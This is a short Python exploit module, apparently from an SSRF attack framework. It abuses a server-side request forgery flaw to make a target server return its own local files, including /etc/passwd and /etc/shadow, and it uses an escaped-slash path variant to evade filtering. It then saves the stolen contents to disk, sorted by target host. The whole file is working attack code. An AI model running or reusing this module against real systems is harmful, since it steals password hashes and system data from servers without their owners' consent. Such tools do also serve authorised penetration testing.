from core.utils import *
import logging
import os

name          = "readfiles"
description   = "Read files from the target"
author        = "Swissky"
documentation = []

class exploit():
    files = ["/etc/passwd", "/etc/lsb-release", "/etc/shadow", "/etc/hosts", "\/\/etc/passwd"]

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            # Create directory to store files
            directory = requester.host
            if not os.path.exists(directory):
                os.makedirs(directory)

            for f in self.files:
                r  = requester.do_request(args.param, wrapper_file(f))
                diff = diff_text(r.text, default)
                if diff != "":

                    # Display diff between default and ssrf request
                    logging.info("\033[32mReading file\033[0m : {}".format(f))
                    print(diff)

                    # Write diff to a file
                    filename = f.replace('\\','_').replace('/','_')
                    logging.info("\033[32mWriting file\033[0m : {} to {}".format(f, directory + "/" + filename))
                    with open(directory + "/" + filename, 'w') as f:
                        f.write(diff)
